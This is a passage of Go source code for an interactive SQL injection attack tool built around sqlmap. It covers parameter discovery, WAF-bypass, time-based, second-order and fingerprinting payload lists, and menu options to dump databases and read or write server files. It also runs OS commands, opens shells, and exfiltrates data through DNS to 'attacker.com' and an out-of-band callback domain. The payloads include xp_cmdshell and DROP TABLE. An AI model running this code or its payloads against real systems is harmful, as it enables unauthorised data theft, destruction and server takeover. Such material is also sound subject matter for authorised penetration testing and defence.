            color.Yellow("[!] No parameters to test")
        }
    }

    // Run full sqlmap
    fmt.Print(color.YellowString("\n[?] Run full sqlmap scan? (y/N): "))
    scanner.Scan()
    if strings.ToLower(strings.TrimSpace(scanner.Text())) == "y" {
        z.engine.RunOnRequest(ctx, reqFile, "standard", "")
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) smartAutomatedTest(ctx context.Context) {
    color.Cyan("\n[ SMART AUTOMATED TESTING ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Scan depth (1-5) [3]: "))
    scanner.Scan()
    depthStr := strings.TrimSpace(scanner.Text())
    depth := 3
    if depthStr != "" {
        if d, err := strconv.Atoi(depthStr); err == nil && d >= 1 && d <= 5 {
            depth = d
        }
    }

    color.Cyan("\n[*] Starting smart scan with depth %d...", depth)

    // Phase 1: Parameter discovery
    color.Yellow("\n[Phase 1] Discovering parameters...")
    params := z.discoverParameters(ctx, targetURL)
    if len(params) == 0 {
        color.Yellow("[!] No parameters found")
        return
    }
    color.Green("[✓] Found %d parameters", len(params))

    // Phase 2: Quick test all parameters
    color.Yellow("\n[Phase 2] Quick testing all parameters...")
    vulnChan := z.detector.Detect(ctx, targetURL, params, "GET")

    var vulnerableParams []string
    for vuln := range vulnChan {
        vulnerableParams = append(vulnerableParams, vuln.Parameter)
        color.Red("[🔥] Vulnerable: %s (%s)", vuln.Parameter, vuln.Dbms)
        z.db.LogVulnerability(&vuln)
    }

    // Phase 3: Deep testing vulnerable parameters
    if len(vulnerableParams) > 0 {
        color.Yellow("\n[Phase 3] Deep testing vulnerable parameters...")
        for _, param := range vulnerableParams {
            testParams := map[string]string{param: "test"}
            deepChan := z.detector.Detect(ctx, targetURL, testParams, "GET")
            for vuln := range deepChan {
                z.db.LogVulnerability(&vuln)
            }
        }
    }

    // Phase 4: Run sqlmap on vulnerable endpoints
    if len(vulnerableParams) > 0 {
        fmt.Print(color.YellowString("\n[?] Run sqlmap on vulnerable endpoints? (Y/n): "))
        scanner.Scan()
        if strings.ToLower(strings.TrimSpace(scanner.Text())) != "n" {
            for _, param := range vulnerableParams {
                testURL := fmt.Sprintf("%s?%s=test", targetURL, param)
                z.engine.Run(ctx, testURL, "standard", "")
            }
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) discoverParameters(ctx context.Context, targetURL string) map[string]string {
    params := make(map[string]string)

    // Common parameter names
    commonParams := []string{
        "id", "page", "user", "username", "name", "search", "q",
        "query", "sort", "order", "limit", "offset", "page", "per_page",
        "filter", "category", "type", "action", "method", "cmd",
        "debug", "test", "lang", "language", "redirect", "url",
        "file", "document", "folder", "root", "path", "pg", "cat",
        "dir", "show", "view", "document_id", "group_id", "parent_id",
        "table", "field", "value", "option", "setting", "config",
    }

    // Test each common parameter
    for _, param := range commonParams {
        testURL := fmt.Sprintf("%s?%s=1", targetURL, param)
        req := &CapturedRequest{
            Method:    "GET",
            URL:       testURL,
            Timestamp: time.Now(),
        }

        resp, _, _, err := z.bridge.CaptureRequest(ctx, req)
        if err == nil && resp.StatusCode < 500 {
            params[param] = "1"
        }
    }

    return params
}

func (z *ZSQLmap) testRequestFile(ctx context.Context) {
    color.Cyan("\n[ TEST REQUEST FILE ]")

    // List available request files
    files, err := filepath.Glob(filepath.Join(z.config.RequestDir, "*.req"))
    if err != nil || len(files) == 0 {
        color.Yellow("[!] No request files found")
        return
    }

    color.Cyan("\nAvailable request files:")
    for i, file := range files {
        info, _ := os.Stat(file)
        color.White("  %2d. %s (%d bytes)", i+1, filepath.Base(file), info.Size())
    }

    fmt.Print(color.YellowString("\n[?] Select file (1-%d): ", len(files)))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())

    idx, err := strconv.Atoi(choice)
    if err != nil || idx < 1 || idx > len(files) {
        color.Red("[!] Invalid selection")
        return
    }

    requestFile := files[idx-1]

    // Test options
    color.Cyan("\nTest Options:")
    color.White("  1. Quick test")
    color.White("  2. Database enumeration")
    color.White("  3. Tables enumeration")
    color.White("  4. Data extraction")
    color.White("  5. OS shell attempt")
    color.White("  6. Full scan")

    fmt.Print(color.YellowString("\n[?] Select test: "))
    scanner.Scan()
    testChoice := strings.TrimSpace(scanner.Text())

    var mode, extra string
    switch testChoice {
    case "1":
        mode = "basic"
    case "2":
        mode = "standard"
        extra = "--dbs"
    case "3":
        mode = "standard"
        fmt.Print(color.YellowString("[?] Database name: "))
        scanner.Scan()
        dbName := strings.TrimSpace(scanner.Text())
        extra = fmt.Sprintf("-D %s --tables", dbName)
    case "4":
        mode = "standard"
        fmt.Print(color.YellowString("[?] Database name: "))
        scanner.Scan()
        dbName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        extra = fmt.Sprintf("-D %s -T %s --dump", dbName, tableName)
    case "5":
        mode = "aggressive"
        extra = "--os-shell"
    default:
        mode = "standard"
    }

    z.engine.RunOnRequest(ctx, requestFile, mode, extra)

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) enumerateDatabase(ctx context.Context) {
    color.Cyan("\n[ DATABASE ENUMERATION ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    color.Cyan("\nEnumeration Options:")
    color.White("  1. List databases")
    color.White("  2. List tables")
    color.White("  3. List columns")
    color.White("  4. Get database version")
    color.White("  5. Get current user")
    color.White("  6. Get current database")
    color.White("  7. Get database users")
    color.White("  8. Get database privileges")

    fmt.Print(color.YellowString("\n[?] Select option: "))
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())

    switch choice {
    case "1":
        z.engine.Run(ctx, targetURL, "standard", "--dbs")
    case "2":
        fmt.Print(color.YellowString("[?] Database name: "))
        scanner.Scan()
        dbName := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s --tables", dbName))
    case "3":
        fmt.Print(color.YellowString("[?] Database name: "))
        scanner.Scan()
        dbName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --columns", dbName, tableName))
    case "4":
        z.engine.Run(ctx, targetURL, "basic", "--sql-query=\"SELECT version()\"")
    case "5":
        z.engine.Run(ctx, targetURL, "basic", "--sql-query=\"SELECT user()\"")
    case "6":
        z.engine.Run(ctx, targetURL, "basic", "--sql-query=\"SELECT database()\"")
    case "7":
        z.engine.Run(ctx, targetURL, "standard", "--users")
    case "8":
        z.engine.Run(ctx, targetURL, "standard", "--privileges")
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) dataExtraction(ctx context.Context) {
    color.Cyan("\n[ DATA EXTRACTION ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Database name: "))
    scanner.Scan()
    dbName := strings.TrimSpace(scanner.Text())

    color.Cyan("\nExtraction Options:")
    color.White("  1. Dump specific table")
    color.White("  2. Dump entire database")
    color.White("  3. Dump all databases")
    color.White("  4. Conditional dump (WHERE clause)")
    color.White("  5. Dump with limit")
    color.White("  6. Dump specific columns")
    color.White("  7. Dump with exclude columns")
    color.White("  8. Dump in CSV format")

    fmt.Print(color.YellowString("\n[?] Select option: "))
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())

    switch choice {
    case "1":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --dump", dbName, tableName))
    case "2":
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s --dump-all", dbName))
    case "3":
        z.engine.Run(ctx, targetURL, "standard", "--dump-all")
    case "4":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] WHERE condition: "))
        scanner.Scan()
        where := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --where=\"%s\" --dump", dbName, tableName, where))
    case "5":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Start row: "))
        scanner.Scan()
        start := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Stop row: "))
        scanner.Scan()
        stop := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --start=%s --stop=%s --dump", dbName, tableName, start, stop))
    case "6":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Columns (comma separated): "))
        scanner.Scan()
        columns := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s -C %s --dump", dbName, tableName, columns))
    case "7":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Exclude columns (comma separated): "))
        scanner.Scan()
        exclude := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --exclude-cols=%s --dump", dbName, tableName, exclude))
    case "8":
        fmt.Print(color.YellowString("[?] Table name: "))
        scanner.Scan()
        tableName := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "standard", fmt.Sprintf("-D %s -T %s --dump --csv", dbName, tableName))
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) advancedOptions(ctx context.Context) {
    color.Cyan("\n[ ADVANCED SQLMAP OPTIONS ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    color.Cyan("\nAdvanced Features:")
    color.White("  1. OS shell")
    color.White("  2. SQL shell")
    color.White("  3. Read file from server")
    color.White("  4. Write file to server")
    color.White("  5. Execute command")
    color.White("  6. Custom SQL query")
    color.White("  7. Privilege escalation")
    color.White("  8. Hash cracking")
    color.White("  9. Registry access (Windows)")
    color.White("  10. UDP tunnel")
    color.White("  11. DNS exfiltration")
    color.White("  12. HTTP headers injection")

    fmt.Print(color.YellowString("\n[?] Select option: "))
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())

    switch choice {
    case "1":
        z.engine.Run(ctx, targetURL, "aggressive", "--os-shell")
    case "2":
        z.engine.Run(ctx, targetURL, "aggressive", "--sql-shell")
    case "3":
        fmt.Print(color.YellowString("[?] File path to read: "))
        scanner.Scan()
        filePath := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "aggressive", fmt.Sprintf("--file-read=%s", filePath))
    case "4":
        fmt.Print(color.YellowString("[?] Local file to upload: "))
        scanner.Scan()
        localFile := strings.TrimSpace(scanner.Text())
        fmt.Print(color.YellowString("[?] Remote path: "))
        scanner.Scan()
        remotePath := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "aggressive", fmt.Sprintf("--file-write=%s --file-dest=%s", localFile, remotePath))
    case "5":
        fmt.Print(color.YellowString("[?] Command to execute: "))
        scanner.Scan()
        cmd := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "aggressive", fmt.Sprintf("--os-cmd=\"%s\"", cmd))
    case "6":
        fmt.Print(color.YellowString("[?] SQL query: "))
        scanner.Scan()
        query := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "basic", fmt.Sprintf("--sql-query=\"%s\"", query))
    case "7":
        z.engine.Run(ctx, targetURL, "aggressive", "--privileges --users")
    case "8":
        z.engine.Run(ctx, targetURL, "standard", "--passwords")
    case "9":
        z.engine.Run(ctx, targetURL, "aggressive", "--reg-read")
    case "10":
        z.engine.Run(ctx, targetURL, "aggressive", "--udp-tunnel")
    case "11":
        z.engine.Run(ctx, targetURL, "aggressive", "--dns-domain=attacker.com")
    case "12":
        fmt.Print(color.YellowString("[?] Headers (format: Header1:Value1,Header2:Value2): "))
        scanner.Scan()
        headers := strings.TrimSpace(scanner.Text())
        z.engine.Run(ctx, targetURL, "aggressive", fmt.Sprintf("--headers=\"%s\"", headers))
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) customPayloadTest(ctx context.Context) {
    color.Cyan("\n[ CUSTOM PAYLOAD TESTER ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Parameter to test: "))
    scanner.Scan()
    param := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Payload (use %%s for injection point): "))
    scanner.Scan()
    payloadTemplate := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Number of tests [10]: "))
    scanner.Scan()
    countStr := strings.TrimSpace(scanner.Text())
    count := 10
    if countStr != "" {
        if c, err := strconv.Atoi(countStr); err == nil {
            count = c
        }
    }

    color.Cyan("\n[*] Running %d custom tests...", count)

    for i := 0; i < count; i++ {
        // Generate variation
        payload := strings.ReplaceAll(payloadTemplate, "%s", fmt.Sprintf("%d", i))
        
        params := map[string]string{param: payload}
        
        req := &CapturedRequest{
            Method:    "GET",
            URL:       targetURL,
            Params:    params,
            Timestamp: time.Now(),
        }

        resp, body, _, err := z.bridge.CaptureRequest(ctx, req)
        if err != nil {
            continue
        }

        // Check for SQL errors
        if z.detector.isVulnerable(resp, body, Payload{Payload: payload}) {
            color.Red("\n[🔥] Vulnerable with payload: %s", payload)
            color.Yellow("    Response code: %d", resp.StatusCode)
            
            vuln := Vulnerability{
                Type:      "Custom SQL Injection",
                Parameter: param,
                Payload:   payload,
                Confidence: 85,
                Severity:  "High",
                Proof:     string(body)[:min(200, len(body))],
                Timestamp: time.Now(),
            }
            z.db.LogVulnerability(&vuln)
        }

        // Progress indicator
        if (i+1)%10 == 0 {
            fmt.Printf(".")
        }
    }

    fmt.Println()

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) wafBypassTest(ctx context.Context) {
    color.Cyan("\n[ WAF BYPASS TECHNIQUES ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Parameter to test: "))
    scanner.Scan()
    param := strings.TrimSpace(scanner.Text())

    bypassPayloads := []string{
        "/*!50000OR*/1=1",
        "/*!12345UNION*//*!12345SELECT*/1,2,3",
        "0x27204f5220273127", // Hex encoded
        "%2527%2520OR%25201%253D1%2520--",
        "1' OR '1'='1' /*!30000AND 1=0*/",
        "1' UNION ALL SELECT NULL,NULL,NULL--",
        "1' AND 1=1 AND 'a'='a",
        "1' /*!30000ORDER BY*/ 1--",
        "1' RLIKE '^1$' AND '1'='1",
        "1' AND 1 REGEXP '^1$'--",
        "' OR 1=1 #",
        "' OR 1=1 -- -",
        "' OR 1=1/*",
        "' OR '1'='1'--",
        "' OR 1=1 LIMIT 1--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT 1,2,3,4,5#",
        "' UNION SELECT 1,2,3,4,5/*",
        "' OR 1=1 AND SLEEP(0)--",
        "' OR '1' LIKE '1",
        "' OR '1'='1'/*!30000*/",
        "' OR '1'='1'-- -",
        "' OR 1=1 INTO OUTFILE '/dev/null'--",
        "' OR 1=1 PROCEDURE ANALYSE()--",
    }

    color.Cyan("\n[*] Testing %d WAF bypass payloads...", len(bypassPayloads))

    for i, payload := range bypassPayloads {
        params := map[string]string{param: payload}
        
        req := &CapturedRequest{
            Method:    "GET",
            URL:       targetURL,
            Params:    params,
            Timestamp: time.Now(),
        }

        resp, body, _, err := z.bridge.CaptureRequest(ctx, req)
        if err != nil {
            continue
        }

        // Check if payload worked
        if strings.Contains(string(body), "Welcome") || 
           strings.Contains(string(body), "admin") ||
           strings.Contains(string(body), "dashboard") {
            color.Green("\n[✓] Bypass successful: %s", payload)
            
            vuln := Vulnerability{
                Type:      "WAF Bypass",
                Parameter: param,
                Payload:   payload,
                Confidence: 90,
                Severity:  "Critical",
                Proof:     string(body)[:min(200, len(body))],
                Timestamp: time.Now(),
            }
            z.db.LogVulnerability(&vuln)
        } else if z.detector.isVulnerable(resp, body, Payload{Payload: payload}) {
            color.Green("\n[✓] SQL injection with WAF bypass: %s", payload)
            
            vuln := Vulnerability{
                Type:      "SQL Injection (WAF Bypass)",
                Parameter: param,
                Payload:   payload,
                Confidence: 95,
                Severity:  "Critical",
                Proof:     string(body)[:min(200, len(body))],
                Timestamp: time.Now(),
            }
            z.db.LogVulnerability(&vuln)
        }

        fmt.Printf(".")
        if (i+1)%5 == 0 {
            fmt.Println()
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) timeBasedTest(ctx context.Context) {
    color.Cyan("\n[ TIME-BASED BLIND TESTING ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Parameter to test: "))
    scanner.Scan()
    param := strings.TrimSpace(scanner.Text())

    timePayloads := []struct {
        name    string
        payload string
        delay   int
        dbms    string
    }{
        {"MySQL Sleep 5", "' AND SLEEP(5)--", 5, "mysql"},
        {"MySQL Sleep 10", "' AND SLEEP(10)--", 10, "mysql"},
        {"MySQL Benchmark", "' AND BENCHMARK(5000000,MD5('a'))--", 3, "mysql"},
        {"PostgreSQL Sleep", "'; SELECT pg_sleep(5)--", 5, "postgresql"},
        {"MSSQL Wait", "'; WAITFOR DELAY '00:00:05'--", 5, "mssql"},
        {"SQLite Sleep", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))--", 4, "sqlite"},
        {"Oracle Sleep", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5, "oracle"},
        {"MySQL Heavy Query", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5, "mysql"},
        {"PostgreSQL Heavy", "'; SELECT 1 FROM pg_sleep(5)--", 5, "postgresql"},
        {"MSSQL Heavy", "'; WAITFOR DELAY '0:0:5'--", 5, "mssql"},
        {"MySQL Time Comment", "' AND SLEEP(5)#", 5, "mysql"},
        {"MySQL Time If", "' AND IF(1=1,SLEEP(5),0)--", 5, "mysql"},
        {"MySQL Time Case", "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--", 5, "mysql"},
        {"MySQL Time RLIKE", "' AND SLEEP(5) RLIKE '^1$'--", 5, "mysql"},
        {"MySQL Time REGEXP", "' AND SLEEP(5) REGEXP '^1$'--", 5, "mysql"},
    }

    color.Cyan("\n[*] Testing time-based injections...")
    color.Yellow("[!] This may take a while...\n")

    for _, tp := range timePayloads {
        fmt.Printf("Testing %s... ", tp.name)

        params := map[string]string{param: tp.payload}
        
        start := time.Now()
        
        req := &CapturedRequest{
            Method:    "GET",
            URL:       targetURL,
            Params:    params,
            Timestamp: time.Now(),
        }

        _, _, _, err := z.bridge.CaptureRequest(ctx, req)
        if err != nil {
            fmt.Printf("error\n")
            continue
        }

        elapsed := time.Since(start)

        if elapsed > time.Duration(tp.delay)*time.Second {
            color.Green("vulnerable (%.2fs) [%s]\n", elapsed.Seconds(), tp.dbms)
            
            vuln := Vulnerability{
                Type:      "Time-Based Blind SQLi",
                Parameter: param,
                Payload:   tp.payload,
                Dbms:      tp.dbms,
                Confidence: 90,
                Severity:  "High",
                Proof:     fmt.Sprintf("Response time: %.2f seconds", elapsed.Seconds()),
                Timestamp: time.Now(),
            }
            z.db.LogVulnerability(&vuln)
        } else {
            color.Yellow("not vulnerable (%.2fs)\n", elapsed.Seconds())
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) secondOrderTest(ctx context.Context) {
    color.Cyan("\n[ SECOND ORDER SQL INJECTION ]")

    fmt.Print(color.YellowString("[?] Target URL (first request): "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    url1 := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Parameter for first request: "))
    scanner.Scan()
    param1 := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Target URL (second request): "))
    scanner.Scan()
    url2 := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Parameter for second request: "))
    scanner.Scan()
    param2 := strings.TrimSpace(scanner.Text())

    // Test payloads
    payloads := []string{
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT 'injected'--",
        "test' AND 1=1--",
        "' UNION SELECT 1,2,3,4--",
        "'; DROP TABLE users--",
        "' OR 1=1 INTO OUTFILE '/tmp/test'--",
        "' UNION SELECT @@version--",
        "' AND 1=1 AND 'a'='a",
        "'; EXEC xp_cmdshell 'whoami'--",
    }

    color.Cyan("\n[*] Testing second order injection...")

    for _, payload := range payloads {
        // First request - inject payload
        params1 := map[string]string{param1: payload}
        
        req1 := &CapturedRequest{
            Method:    "POST",
            URL:       url1,
            Data:      params1,
            Timestamp: time.Now(),
        }

        _, _, _, err := z.bridge.CaptureRequest(ctx, req1)
        if err != nil {
            continue
        }

        // Second request - trigger injection
        params2 := map[string]string{param2: "test"}
        
        req2 := &CapturedRequest{
            Method:    "GET",
            URL:       url2,
            Params:    params2,
            Timestamp: time.Now(),
        }

        resp2, body2, _, err := z.bridge.CaptureRequest(ctx, req2)
        if err != nil {
            continue
        }

        // Check if injection worked
        if strings.Contains(string(body2), "injected") || 
           strings.Contains(string(body2), "admin") ||
           strings.Contains(strings.ToLower(string(body2)), "sql") ||
           strings.Contains(string(body2), "version") {
            color.Green("\n[✓] Second order injection with payload: %s", payload)
            
            vuln := Vulnerability{
                Type:      "Second Order SQL Injection",
                Parameter: param1 + " -> " + param2,
                Payload:   payload,
                Confidence: 85,
                Severity:  "High",
                Proof:     string(body2)[:min(200, len(body2))],
                Timestamp: time.Now(),
            }
            z.db.LogVulnerability(&vuln)
        }

        // Use resp2 to avoid unused variable warning
        _ = resp2
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) outOfBandTest(ctx context.Context) {
    color.Cyan("\n[ OUT-OF-BAND TESTING ]")

    // Start DNS callback server
    callbackPort := 8081
    color.Cyan("[*] Starting DNS callback server on port %d", callbackPort)

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    fmt.Print(color.YellowString("[?] Parameter to test: "))
    scanner.Scan()
    param := strings.TrimSpace(scanner.Text())

    // Get local IP
    localIP := z.getLocalIP()
    callbackDomain := fmt.Sprintf("%s.x%x.oastify.com", 
        strings.ReplaceAll(localIP, ".", "-"),
        time.Now().UnixNano())

    oobPayloads := []string{
        fmt.Sprintf("' AND LOAD_FILE('\\\\%s\\test')--", callbackDomain),
        fmt.Sprintf("'; EXEC xp_cmdshell 'nslookup %s'--", callbackDomain),
        fmt.Sprintf("' UNION SELECT LOAD_FILE('//%s/test')--", callbackDomain),
        fmt.Sprintf("' OR 1=UTL_HTTP.REQUEST('%s')--", callbackDomain),
        fmt.Sprintf("' AND 1=DBMS_LDAP.INIT(('%s',80))--", callbackDomain),
        fmt.Sprintf("' EXEC master..xp_dirtree '//%s/test'--", callbackDomain),
        fmt.Sprintf("' AND 1=(SELECT UTL_INADDR.get_host_addr('%s'))--", callbackDomain),
        fmt.Sprintf("' AND 1=DBMS_AW_STATS.LISTDIMS('%s')--", callbackDomain),
        fmt.Sprintf("' AND 1=DBMS_SCHEDULER.CREATE_JOB(job_name=>'%s')--", callbackDomain),
    }

    color.Cyan("\n[*] Testing %d OOB payloads...", len(oobPayloads))
    color.Yellow("[*] Callback domain: %s", callbackDomain)

    for _, payload := range oobPayloads {
        params := map[string]string{param: payload}
        
        req := &CapturedRequest{
            Method:    "GET",
            URL:       targetURL,
            Params:    params,
            Timestamp: time.Now(),
        }

        _, _, _, err := z.bridge.CaptureRequest(ctx, req)
        if err != nil {
            continue
        }

        fmt.Printf(".")
    }

    fmt.Println("\n")
    color.Yellow("[*] Check your DNS logs for callbacks from %s", callbackDomain)

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) dbmsFingerprint(ctx context.Context) {
    color.Cyan("\n[ DBMS FINGERPRINTING ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    fmt.Print(color.YellowString("[?] Parameter to test: "))
    scanner.Scan()
    param := strings.TrimSpace(scanner.Text())

    fingerprintPayloads := []struct {
        name    string
        payload string
        dbms    string
    }{
        {"MySQL String Concatenation", "' AND 'a' 'b'='ab'--", "mysql"},
        {"PostgreSQL String Concatenation", "' AND 'a'||'b'='ab'--", "postgresql"},
        {"Oracle String Concatenation", "' AND 'a'||'b'='ab'--", "oracle"},
        {"MSSQL String Concatenation", "' AND 'a'+'b'='ab'--", "mssql"},
        {"MySQL Version Comment", "'/*!40100*/ AND 1=1--", "mysql"},
        {"MySQL Information Schema", "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", "mysql"},
        {"PostgreSQL Information Schema", "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", "postgresql"},
        {"Oracle DUAL Table", "' AND 1=(SELECT COUNT(*) FROM dual)--", "oracle"},
        {"MSSQL sysobjects", "' AND 1=(SELECT COUNT(*) FROM sysobjects)--", "mssql"},
        {"SQLite sqlite_master", "' AND 1=(SELECT COUNT(*) FROM sqlite_master)--", "sqlite"},
        {"MySQL SLEEP", "' AND SLEEP(1)--", "mysql"},
        {"PostgreSQL pg_sleep", "'; SELECT pg_sleep(1)--", "postgresql"},
        {"MSSQL WAITFOR", "'; WAITFOR DELAY '0:0:1'--", "mssql"},
        {"Oracle DBMS_PIPE", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',1)--", "oracle"},
    }

    color.Cyan("\n[*] Fingerprinting DBMS...\n")

    for _, fp := range fingerprintPayloads {
        fmt.Printf("Testing %s... ", fp.name)

        params := map[string]string{param: fp.payload}
        
        req := &CapturedRequest{
            Method:    "GET",
            URL:       targetURL,
            Params:    params,
            Timestamp: time.Now(),
        }

        resp, body, _, err := z.bridge.CaptureRequest(ctx, req)
        if err != nil {
            fmt.Printf("error\n")
            continue
        }

        // Check for success
        if resp.StatusCode < 500 && !strings.Contains(string(body), "error") {
            color.Green("possible %s\n", fp.dbms)
        } else {
            color.Yellow("no\n")
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) viewAuditHistory() {
    color.Cyan("\n[ AUDIT HISTORY ]")

    history, err := z.db.GetAuditHistory(20)
    if err != nil {
        color.Red("[✗] Failed to get history: %v", err)
        return
    }

    if len(history) == 0 {
        color.Yellow("[!] No audit history found")
        fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
        scanner := bufio.NewScanner(os.Stdin)
        scanner.Scan()
        return
    }

    fmt.Printf("\n%-4s %-19s %-30s %-8s %s\n", "ID", "Time", "Target", "Method", "Result")
    fmt.Println(strings.Repeat("-", 80))

    for _, log := range history {
        target := log.TargetURL
        if len(target) > 28 {
            target = target[:25] + "..."
        }
        result := log.Result
        if len(result) > 18 {
            result = result[:15] + "..."
        }
        fmt.Printf("%-4d %-19s %-30s %-8s %s\n",
            log.ID,
            log.Timestamp.Format("15:04:05 01-02"),
            target,
            log.Method,
            result)
    }

    // Show vulnerabilities summary
    vulns, err := z.db.GetVulnerabilities("", "")
    if err == nil && len(vulns) > 0 {
        fmt.Println("\n" + strings.Repeat("-", 80))
        fmt.Printf("Recent Vulnerabilities (%d total):\n", len(vulns))

        for i, v := range vulns {
            if i >= 5 {
                break
            }
